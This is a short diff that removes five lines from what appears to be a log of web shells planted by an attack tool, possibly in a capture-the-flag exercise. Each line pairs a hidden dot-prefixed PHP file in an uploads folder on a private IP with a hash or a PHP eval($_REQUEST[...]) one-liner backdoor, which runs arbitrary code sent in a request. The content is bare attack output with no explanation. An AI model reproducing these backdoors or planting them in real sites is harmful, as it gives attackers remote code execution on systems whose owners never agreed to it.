@@ -1,5 +1,0 @@
-http://192.168.43.138/uploads/.iIdOlSLaaNJuyAzY.php => 7ac53ff5e220dd980fe66a960ec000c0
-http://192.168.43.138/uploads/.YqdkbbEgWUfrLyIg.php => '<?php eval($_REQUEST[e3958d00e169a88c6c328d101e307a1d]);?>'
-http://192.168.43.138/uploads/.XmcqsXpqhfHpGlMr.php => '<?php eval($_REQUEST[556e64362eea049b186a7a767fcfb6a1]);?>'
-http://192.168.43.138/uploads/.KmKhJtLmaOaQoTTj.php => '<?php eval($_REQUEST[efd652a641b58d1403570ce431a4d19c]);?>'
-http://192.168.43.138/uploads/.RFCmlGUZBMRKCjAk.php => '<?php eval($_REQUEST[e68000736a398f27d5ba244025273bb5]);?>'
